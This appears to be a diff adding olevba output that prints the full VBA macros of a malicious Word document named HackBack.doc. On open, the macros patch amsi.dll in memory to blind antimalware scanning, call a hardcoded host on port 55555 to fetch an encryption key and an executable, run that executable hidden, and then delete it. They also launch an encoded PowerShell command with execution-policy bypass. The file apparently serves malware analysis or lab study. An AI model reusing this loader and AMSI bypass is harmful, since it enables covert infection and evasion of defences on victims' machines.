@@ -1,0 +1,667 @@
+olevba 0.56 on Python 2.7.18 - http://decalage.info/python/oletools
+===============================================================================
+FILE: HackBack.doc
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: HackBack.doc - OLE stream: u'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO req.bas 
+in file: HackBack.doc - OLE stream: u'Macros/VBA/Req'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Public h As String
+Public p As String
+Public localpath As String
+
+Function reqkey(folderec As String) As String
+Dim folder As String
+Dim loc As String, r As Object, url As String
+folder = DecryptString(pw, iv, folderec)
+loc = "/" & folder & "/Key.txt"
+Set r = CreateObject("WinHttp.WinHttpRequest.5.1")
+url = "http://" & h & ":" & p & loc
+r.Open "GET", url, False
+r.Option(0) = "Req Trick Agent v1.0"
+r.Option(4) = 13056
+r.Option(12) = True
+r.Send
+reqkey = r.ResponseText
+End Function
+
+Function reqfile(folder As String) As String
+Dim loc As String, r As Object, url As String
+loc = "/" & folder & "/Update.exe"
+Set r = CreateObject("WinHttp.WinHttpRequest.5.1")
+url = "http://" & h & ":" & p & loc
+r.Open "GET", url, False
+r.Option(0) = "Req Trick Agent v1.0"
+r.Option(4) = 13056
+r.Option(12) = True
+r.Send
+localpath = "C://Temp//Update.exe"
+Dim oStream As Object
+If r.Status = 200 Then
+    Set oStream = CreateObject("ADODB.Stream")
+    oStream.Open
+    oStream.Type = 1
+    oStream.Write r.ResponseBody
+    oStream.SaveToFile localpath, 2
+    oStream.Close
+End If
+reqfile = localpath
+End Function
+
+Function reqcreate(campaign As String, sl As Integer) As String
+    Dim folder As String
+    Dim loc As String, r As Object, url As String
+    h = "10.10.100.200"
+    p = "55555"
+    loc = "/create.php?c=" & campaign & "&s=" & sl
+    Set r = CreateObject("WinHttp.WinHttpRequest.5.1")
+    url = "http://" & h & ":" & p & loc
+    r.Open "GET", url, False
+    r.Option(0) = "Req Trick Agent v1.0"
+    r.Option(4) = 13056
+    r.Option(12) = True
+    r.Send
+    reqcreate = r.ResponseText
+End Function
+
+-------------------------------------------------------------------------------
+VBA MACRO Base64.bas 
+in file: HackBack.doc - OLE stream: u'Macros/VBA/Base64'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Option Explicit
+
+Private Const clOneMask = 16515072          '000000 111111 111111 111111
+Private Const clTwoMask = 258048            '111111 000000 111111 111111
+Private Const clThreeMask = 4032            '111111 111111 000000 111111
+Private Const clFourMask = 63               '111111 111111 111111 000000
+
+Private Const clHighMask = 16711680         '11111111 00000000 00000000
+Private Const clMidMask = 65280             '00000000 11111111 00000000
+Private Const clLowMask = 255               '00000000 00000000 11111111
+
+Private Const cl2Exp18 = 262144             '2 to the 18th power
+Private Const cl2Exp12 = 4096               '2 to the 12th
+Private Const cl2Exp6 = 64                  '2 to the 6th
+Private Const cl2Exp8 = 256                 '2 to the 8th
+Private Const cl2Exp16 = 65536              '2 to the 16th
+
+Public Function Encode64(sString As String) As String
+
+    Dim bTrans(63) As Byte, lPowers8(255) As Long, lPowers16(255) As Long, bOut() As Byte, bIn() As Byte
+    Dim lChar As Long, lTrip As Long, iPad As Integer, lLen As Long, lTemp As Long, lPos As Long, lOutSize As Long
+
+    For lTemp = 0 To 63                                 'Fill the translation table.
+        Select Case lTemp
+            Case 0 To 25
+                bTrans(lTemp) = 65 + lTemp              'A - Z
+            Case 26 To 51
+                bTrans(lTemp) = 71 + lTemp              'a - z
+            Case 52 To 61
+                bTrans(lTemp) = lTemp - 4               '1 - 0
+            Case 62
+                bTrans(lTemp) = 43                      'Chr(43) = "+"
+            Case 63
+                bTrans(lTemp) = 47                      'Chr(47) = "/"
+        End Select
+    Next lTemp
+
+    For lTemp = 0 To 255                                'Fill the 2^8 and 2^16 lookup tables.
+        lPowers8(lTemp) = lTemp * cl2Exp8
+        lPowers16(lTemp) = lTemp * cl2Exp16
+    Next lTemp
+
+    iPad = Len(sString) Mod 3                           'See if the length is divisible by 3
+    If iPad Then                                        'If not, figure out the end pad and resize the input.
+        iPad = 3 - iPad
+        sString = sString & String(iPad, Chr(0))
+    End If
+
+    bIn = StrConv(sString, vbFromUnicode)               'Load the input string.
+    lLen = ((UBound(bIn) + 1) \ 3) * 4                  'Length of resulting string.
+    lTemp = lLen \ 72                                   'Added space for vbCrLfs.
+    lOutSize = ((lTemp * 2) + lLen) - 1                 'Calculate the size of the output buffer.
+    ReDim bOut(lOutSize)                                'Make the output buffer.
+
+    lLen = 0                                            'Reusing this one, so reset it.
+
+    For lChar = LBound(bIn) To UBound(bIn) Step 3
+        lTrip = lPowers16(bIn(lChar)) + lPowers8(bIn(lChar + 1)) + bIn(lChar + 2)    'Combine the 3 bytes
+        lTemp = lTrip And clOneMask                     'Mask for the first 6 bits
+        bOut(lPos) = bTrans(lTemp \ cl2Exp18)           'Shift it down to the low 6 bits and get the value
+        lTemp = lTrip And clTwoMask                     'Mask for the second set.
+        bOut(lPos + 1) = bTrans(lTemp \ cl2Exp12)       'Shift it down and translate.
+        lTemp = lTrip And clThreeMask                   'Mask for the third set.
+        bOut(lPos + 2) = bTrans(lTemp \ cl2Exp6)        'Shift it down and translate.
+        bOut(lPos + 3) = bTrans(lTrip And clFourMask)   'Mask for the low set.
+        If lLen = 68 Then                               'Ready for a newline
+            bOut(lPos + 4) = 13                         'Chr(13) = vbCr
+            bOut(lPos + 5) = 10                         'Chr(10) = vbLf
+            lLen = 0                                    'Reset the counter
+            lPos = lPos + 6
+        Else
+            lLen = lLen + 4
+            lPos = lPos + 4
+        End If
+    Next lChar
+
+    If bOut(lOutSize) = 10 Then lOutSize = lOutSize - 2 'Shift the padding chars down if it ends with CrLf.
+
+    If iPad = 1 Then                                    'Add the padding chars if any.
+        bOut(lOutSize) = 61                             'Chr(61) = "="
+    ElseIf iPad = 2 Then
+        bOut(lOutSize) = 61
+        bOut(lOutSize - 1) = 61
+    End If
+
+    Encode64 = StrConv(bOut, vbUnicode)                 'Convert back to a string and return it.
+
+End Function
+
+Public Function Decode64(sString As String) As String
+
+    Dim bOut() As Byte, bIn() As Byte, bTrans(255) As Byte, lPowers6(63) As Long, lPowers12(63) As Long
+    Dim lPowers18(63) As Long, lQuad As Long, iPad As Integer, lChar As Long, lPos As Long, sOut As String
+    Dim lTemp As Long
+
+    sString = Replace(sString, vbCr, vbNullString)      'Get rid of the vbCrLfs.  These could be in...
+    sString = Replace(sString, vbLf, vbNullString)      'either order.
+
+    lTemp = Len(sString) Mod 4                          'Test for valid input.
+    If lTemp Then
+        Call Err.Raise(vbObjectError, "MyDecode", "Input string is not valid Base64.")
+    End If
+
+    If InStrRev(sString, "==") Then                     'InStrRev is faster when you know it's at the end.
+        iPad = 2                                        'Note:  These translate to 0, so you can leave them...
+    ElseIf InStrRev(sString, "=") Then                  'in the string and just resize the output.
+        iPad = 1
+    End If
+
+    For lTemp = 0 To 255                                'Fill the translation table.
+        Select Case lTemp
+            Case 65 To 90
+                bTrans(lTemp) = lTemp - 65              'A - Z
+            Case 97 To 122
+                bTrans(lTemp) = lTemp - 71              'a - z
+            Case 48 To 57
+                bTrans(lTemp) = lTemp + 4               '1 - 0
+            Case 43
+                bTrans(lTemp) = 62                      'Chr(43) = "+"
+            Case 47
+                bTrans(lTemp) = 63                      'Chr(47) = "/"
+        End Select
+    Next lTemp
+
+    For lTemp = 0 To 63                                 'Fill the 2^6, 2^12, and 2^18 lookup tables.
+        lPowers6(lTemp) = lTemp * cl2Exp6
+        lPowers12(lTemp) = lTemp * cl2Exp12
+        lPowers18(lTemp) = lTemp * cl2Exp18
+    Next lTemp
+
+    bIn = StrConv(sString, vbFromUnicode)               'Load the input byte array.
+    ReDim bOut((((UBound(bIn) + 1) \ 4) * 3) - 1)       'Prepare the output buffer.
+
+    For lChar = 0 To UBound(bIn) Step 4
+        lQuad = lPowers18(bTrans(bIn(lChar))) + lPowers12(bTrans(bIn(lChar + 1))) + _
+                lPowers6(bTrans(bIn(lChar + 2))) + bTrans(bIn(lChar + 3))           'Rebuild the bits.
+        lTemp = lQuad And clHighMask                    'Mask for the first byte
+        bOut(lPos) = lTemp \ cl2Exp16                   'Shift it down
+        lTemp = lQuad And clMidMask                     'Mask for the second byte
+        bOut(lPos + 1) = lTemp \ cl2Exp8                'Shift it down
+        bOut(lPos + 2) = lQuad And clLowMask            'Mask for the third byte
+        lPos = lPos + 3
+    Next lChar
+
+    sOut = StrConv(bOut, vbUnicode)                     'Convert back to a string.
+    If iPad Then sOut = Left$(sOut, Len(sOut) - iPad)   'Chop off any extra bytes.
+    Decode64 = sOut
+
+End Function
+
+-------------------------------------------------------------------------------
+VBA MACRO init.bas 
+in file: HackBack.doc - OLE stream: u'Macros/VBA/init'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Public gokey As String
+Public keyfolder As String
+Public gofolder As String
+Public iv As String
+Public pw As String
+
+Function initialize(gofolderenc As String)
+    pw = "2jce3LsR9khUon5dLu2F1DlDDK5np1xP"
+    keyfolder = "iDGJoEgNHt3DnfrGfcIVY1o/ytcANZVWq8167WFIc00uhfnYPcY673/E4mgGFeNh"
+    iv = "Y21FR2lTdTE5Mk5OODBMaQ=="
+    gokey = reqkey(keyfolder)
+    gofolder = DecryptString(pw, iv, gofolderenc)
+    initialize = reqfile(gofolder)
+End Function
+
+-------------------------------------------------------------------------------
+VBA MACRO Main.bas 
+in file: HackBack.doc - OLE stream: u'Macros/VBA/Main'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+#If VBA7 Then
+ Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr) 'For 64 Bit Systems
+#Else
+ Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) 'For 32 Bit Systems
+#End If
+Sub AutoOpen()
+Dim strFolderName1 As String
+Dim strFolderName2 As String
+Dim strFolderExists1 As String
+Dim strFolderExists2 As String
+    strFolderName1 = "C:\Windows\Microsoft.Net\Framework\v3.5\"
+    strFolderName2 = "C:\Windows\Microsoft.Net\Framework64\v3.5\"
+    strFolderExists1 = Dir(strFolderName1, vbDirectory)
+    strFolderExists2 = Dir(strFolderName2, vbDirectory)
+    If strFolderExists1 = "" And strFolderExists2 = "" Then
+        MsgBox "Microsoft .NET 3.5 Required for Decryption", vbOKOnly, "Alert"
+        Dim install As String
+        install = "powershell -exec bypass -noni -nop -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAZABpAHMAbQAiACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALwBvAG4AbABpAG4AZQAgAC8AZQBuAGEAYgBsAGUALQBmAGUAYQB0AHUAcgBlACAALwBmAGUAYQB0AHUAcgBlAG4AYQBtAGUAOgBOAGUAdABGAHgAMwAiACAALQBWAGUAcgBiACAAcgB1AG4AQQBzAA=="
+        CreateObject("Wscript.Shell").Run install, 1, True
+        Application.Quit
+    End If
+    TestOfficeVersion
+    mkfolder
+    begin
+    nuke
+End Sub
+
+Sub mkfolder()
+Dim strFolderName As String
+Dim strFolderExists As String
+    strFolderName = "C:\Temp\"
+    strFolderExists = Dir(strFolderName, vbDirectory)
+    If strFolderExists = "" Then
+        MkDir strFolderName
+    End If
+End Sub
+
+Sub begin()
+Dim campaign As String
+Dim gofolderenc As String, sl As Integer
+Dim k As String, go As String
+    sl = 1
+    campaign = "7"
+    Sleep sl * 1000
+    gofolderenc = reqcreate(campaign, sl)
+    k = initialize(gofolderenc)
+    go = localpath & " " & gokey
+    CreateObject("Wscript.Shell").Run go, 0, True
+End Sub
+
+Function FileExists(ByVal FileToTest As String) As Boolean
+   FileExists = (Dir(FileToTest) <> "")
+End Function
+
+Sub nuke()
+Dim FileToDelete As String
+FileToDelete = "C://Temp//Update.exe"
+    If FileExists(FileToDelete) Then
+        SetAttr FileToDelete, vbNormal
+        Kill FileToDelete
+   End If
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Encode.bas 
+in file: HackBack.doc - OLE stream: u'Macros/VBA/Encode'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
+Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long
+ 
+
+Public Function fConvertHexToString(strHexString As String) As String
+Dim intLenOfString As Integer
+Dim intCounter As Integer
+Dim strBuild As String
+
+'Hex String must have a valid length, and it must be an even length
+If Len(strHexString) = 0 Or Len(strHexString) Mod 2 <> 0 Then Exit Function
+ 
+intLenOfString = Len(strHexString)
+ 
+For intCounter = 1 To Len(strHexString)
+  If intCounter Mod 2 <> 0 Then     'need Hex pairs
+    'Retrieve the Value of the Hex Pair, then Convert to a Character,
+    'then Append to a Base String
+    strBuild = strBuild & Chr$(Val("&H" & Mid$(strHexString, intCounter, 2)))
+  End If
+Next
+fConvertHexToString = strBuild
+End Function
+
+Public Function HexToBytes(ByVal HexString As String) As Byte()
+    'Quick and dirty hex String to Byte array.  Accepts:
+    '
+    '   "HH HH HH"
+    '   "HHHHHH"
+    '   "H HH H"
+    '   "HH,HH,     HH" and so on.
+
+    Dim bytes() As Byte
+    Dim HexPos As Integer
+    Dim HexDigit As Integer
+    Dim BytePos As Integer
+    Dim Digits As Integer
+
+    ReDim bytes(Len(HexString) \ 2)  'Initial estimate.
+    For HexPos = 1 To Len(HexString)
+        HexDigit = InStr("0123456789ABCDEF", _
+                         UCase$(Mid$(HexString, HexPos, 1))) - 1
+        If HexDigit >= 0 Then
+            If BytePos > UBound(bytes) Then
+                'Add some room, we'll add room for 4 more to decrease
+                'how often we end up doing this expensive step:
+                ReDim Preserve bytes(UBound(bytes) + 4)
+            End If
+            bytes(BytePos) = bytes(BytePos) * &H10 + HexDigit
+            Digits = Digits + 1
+        End If
+        If Digits = 2 Or HexDigit < 0 Then
+            If Digits > 0 Then BytePos = BytePos + 1
+            Digits = 0
+        End If
+    Next
+    If Digits = 0 Then BytePos = BytePos - 1
+    If BytePos < 0 Then
+        bytes = "" 'Empty.
+    Else
+        ReDim Preserve bytes(BytePos)
+    End If
+    HexToBytes = bytes
+End Function
+
+Function ToHexString(rabyt)
+  With CreateObject("MSXML2.DOMDocument")
+    .LoadXML "<root />"
+    .DocumentElement.DataType = "bin.Hex"
+    .DocumentElement.NodeTypedValue = rabyt
+    ToHexString = Replace(.DocumentElement.text, vbLf, "")
+  End With
+End Function
+
+
+Public Function BytesToHex(ByRef bytes() As Byte) As String
+    'Quick and dirty Byte array to hex String, format:
+    '
+    '   "HH HH HH"
+
+    Dim LB As Long
+    Dim ByteCount As Long
+    Dim BytePos As Integer
+
+    LB = LBound(bytes)
+    ByteCount = UBound(bytes) - LB + 1
+    If ByteCount < 1 Then Exit Function
+    BytesToHex = Space$(3 * (ByteCount - 1) + 2)
+    For BytePos = LB To UBound(bytes)
+        Mid$(BytesToHex, 3 * (BytePos - LB) + 1, 2) = _
+            Right$("0" & Hex$(bytes(BytePos)), 2)
+    Next
+End Function
+
+Function B64Decode(b64Str)
+    Dim utf8 As Object
+    Dim bytes() As Byte
+    Dim b64Dec As Object
+    
+    Set utf8 = CreateObject("System.Text.UTF8Encoding")
+    Set b64Dec = CreateObject("System.Security.Cryptography.FromBase64Transform")
+    bytes = utf8.GetBytes_4(b64Str)
+    B64Decode = b64Dec.TransformFinalBlock((bytes), 0, UBound(bytes) + 1)
+End Function
+
+
+Function Min(A, B)
+    Min = A
+    If B < A Then Min = B
+End Function
+
+Function B64Encode(bytes)
+    Dim result As String
+    Dim b64Block() As Byte
+    Dim b64Enc As Object
+    Dim utf8 As Object
+    Dim Offset, Length, BlockSize As Integer
+    
+    Set b64Enc = CreateObject("System.Security.Cryptography.ToBase64Transform")
+    Set utf8 = CreateObject("System.Text.UTF8Encoding")
+    BlockSize = b64Enc.InputBlockSize
+    For Offset = 0 To LenB(bytes) - 1 Step BlockSize
+        Length = Min(BlockSize, UBound(bytes) + 1 - Offset)
+        b64Block = b64Enc.TransformFinalBlock((bytes), Offset, Length)
+        result = result & utf8.GetString((b64Block))
+    Next
+    B64Encode = result
+End Function
+-------------------------------------------------------------------------------
+VBA MACRO DCString.bas 
+in file: HackBack.doc - OLE stream: u'Macros/VBA/DCString'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Function DecryptString(pw As String, iv As String, ci As String) As String
+Dim text As Object, symmetricKey As Object, ivb As String
+Dim abc() As Byte, final() As Byte
+Set text = CreateObject("System.Text.UTF8Encoding")
+Set symmetricKey = CreateObject("System.Security.Cryptography.RijndaelManaged")
+ivb = Decode64(iv)
+With symmetricKey
+        .key = text.GetBytes_4(pw)
+        .iv = text.GetBytes_4(ivb)
+        .Padding = 2
+    End With
+    abc = B64Decode(ci)
+    final = symmetricKey.CreateDecryptor().TransformFinalBlock(abc, 0, UBound(abc) + 1)
+    DecryptString = Decode64(B64Encode(final))
+End Function
+-------------------------------------------------------------------------------
+VBA MACRO bpa.bas 
+in file: HackBack.doc - OLE stream: u'Macros/VBA/bpa'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
+Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
+ 
+Private Declare PtrSafe Sub ByteSwapper Lib "kernel32.dll" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
+ 
+Declare PtrSafe Sub Peek Lib "msvcrt" Alias "memcpy" (ByRef pDest As Any, ByRef pSource As Any, ByVal nBytes As Long)
+ 
+Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+Private Declare PtrSafe Function OpenProcess Lib "kernel32.dll" (ByVal dwAccess As Long, ByVal fInherit As Integer, ByVal hObject As Long) As Long
+Private Declare PtrSafe Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
+Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+ 
+Private Type PROCESS_INFORMATION
+    hProcess As Long
+    hThread As Long
+    dwProcessId As Long
+    dwThreadId As Long
+End Type
+ 
+Private Type STARTUPINFO
+    cb As Long
+    lpReserved As String
+    lpDesktop As String
+    lpTitle As String
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As Long
+    hStdInput As Long
+    hStdOutput As Long
+    hStdError As Long
+End Type
+ 
+Const CREATE_NO_WINDOW = &H8000000
+Const CREATE_NEW_CONSOLE = &H10
+ 
+Function LoadDll(dll As String, func As String) As LongPtr
+ 
+Dim AmsiDLL As LongPtr
+ 
+AmsiDLL = LoadLibrary(dll)
+LoadDll = GetProcAddress(AmsiDLL, func)
+ 
+End Function
+ 
+Function GetBuffer(LeakedAmsiDllAddr As LongPtr, TraverseOffset As Integer) As String
+ 
+Dim LeakedBytesBuffer As String
+Dim LeakedByte As LongPtr
+Dim TraverseStartAddr As LongPtr
+ 
+On Error Resume Next
+ 
+TraverseStartAddr = LeakedAmsiDllAddr - TraverseOffset
+ 
+Dim i As Integer
+For i = 0 To TraverseOffset
+    Peek LeakedByte, ByVal (TraverseStartAddr + i), 1
+ 
+    If LeakedByte < 16 Then
+        FixedByteString = "0" & Hex(LeakedByte)
+        LeakedBytesBuffer = LeakedBytesBuffer & FixedByteString
+    Else
+        LeakedBytesBuffer = LeakedBytesBuffer & Hex(LeakedByte)
+    End If
+Next i
+ 
+GetBuffer = LeakedBytesBuffer
+ 
+End Function
+ 
+Function FindPatchOffset(LeakedAmsiDllAddr As LongPtr, TraverseOffset As Integer, InstructionInStringOffset As Integer) As LongPtr
+ 
+Dim memOffset As Integer
+ 
+memOffset = (InstructionInStringOffset - 1) / 2
+FindPatchOffset = (LeakedAmsiDllAddr - TraverseOffset) + memOffset
+ 
+End Function
+ 
+Sub x64_office()
+ 
+Dim LeakedAmsiDllAddr As LongPtr
+ 
+Dim ScanBufferMagicBytes As String
+Dim ScanStringMagicBytes As String
+Dim LeakedBytesBuffer As String
+Dim AmsiScanBufferPatchAddr As LongPtr
+Dim AmsiScanStringPatchAddr As LongPtr
+Dim TrvOffset As Integer
+ 
+Dim InstructionInStringOffset As Integer
+Dim Success As Integer
+ 
+ScanBufferMagicBytes = "4C8BDC49895B08"
+ScanStringMagicBytes = "4883EC384533DB"
+TrvOffset = 352
+Success = 0
+ 
+LeakedAmsiDllAddr = LoadDll("amsi.dll", "AmsiUacInitialize")
+ 
+LeakedBytesBuffer = GetBuffer(LeakedAmsiDllAddr, TrvOffset)
+ 
+InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanBufferMagicBytes)
+If InstructionInStringOffset = 0 Then
+    ' MsgBox "We didn't find the scanbuffer magicbytes :/"
+Else
+    AmsiScanBufferPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset)
+ 
+    result = VirtualProtect(ByVal AmsiScanBufferPatchAddr, 32, 64, 0)
+    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 0), 1, Val("&H" & "90")
+    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 1), 1, Val("&H" & "C3")
+    Success = Success + 1
+End If
+ 
+ 
+InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanStringMagicBytes)
+If InstructionInStringOffset = 0 Then
+    ' MsgBox "We didn't find the scanstring magicbytes :/"
+Else
+    AmsiScanStringPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset)
+ 
+    result = VirtualProtect(ByVal AmsiScanStringPatchAddr, 32, 64, 0)
+    ByteSwapper ByVal (AmsiScanStringPatchAddr + 0), 1, Val("&H" & "90")
+    ByteSwapper ByVal (AmsiScanStringPatchAddr + 1), 1, Val("&H" & "C3")
+    Success = Success + 1
+End If
+ 
+End Sub
+ 
+Sub x32_office()
+ 
+Dim LeakedAmsiDllAddr As LongPtr
+ 
+Dim ScanBufferMagicBytes As String
+Dim ScanStringMagicBytes As String
+Dim LeakedBytesBuffer As String
+Dim AmsiScanBufferPatchAddr As LongPtr
+Dim AmsiScanStringPatchAddr As LongPtr
+Dim TrvOffset As Integer
+ 
+Dim InstructionInStringOffset As Integer
+Dim Success As Integer
+ 
+ScanBufferMagicBytes = "8B450C85C0745A85DB"
+ScanStringMagicBytes = "8B550C85D27434837D"
+TrvOffset = 300
+Success = 0
+ 
+LeakedAmsiDllAddr = LoadDll("amsi.dll", "AmsiUacInitialize")
+ 
+LeakedBytesBuffer = GetBuffer(LeakedAmsiDllAddr, TrvOffset)
+ 
+InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanBufferMagicBytes)
+If InstructionInStringOffset = 0 Then
+    ' MsgBox "We didn't find the scanbuffer magicbytes :/"
+Else
+    AmsiScanBufferPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset)
+ 
+    'Debug.Print Hex(AmsiScanBufferPatchAddr)
+ 
+    result = VirtualProtect(ByVal AmsiScanBufferPatchAddr, 32, 64, 0)
+    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 0), 1, Val("&H" & "90")
+    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 1), 1, Val("&H" & "31")
+    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 2), 1, Val("&H" & "C0")
+    Success = Success + 1
+End If
+ 
+InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanStringMagicBytes)
+If InstructionInStringOffset = 0 Then
+    ' MsgBox "We didn't find the scanstring magicbytes :/"
+Else
+    AmsiScanStringPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset)
+ 
+    'Debug.Print Hex(AmsiScanStringPatchAddr)
+ 
+    result = VirtualProtect(ByVal AmsiScanStringPatchAddr, 32, 64, 0)
+    ByteSwapper ByVal (AmsiScanStringPatchAddr + 0), 1, Val("&H" & "90")
+    ByteSwapper ByVal (AmsiScanStringPatchAddr + 1), 1, Val("&H" & "31")
+    ByteSwapper ByVal (AmsiScanStringPatchAddr + 2), 1, Val("&H" & "D2")
+    Success = Success + 1
+End If
+ 
+End Sub
+ 
+Sub TestOfficeVersion()
+ 
+#If Win64 Then
+    Call x64_office
+#ElseIf Win32 Then
+    Call x32_office
+#End If
+ 
+End Sub
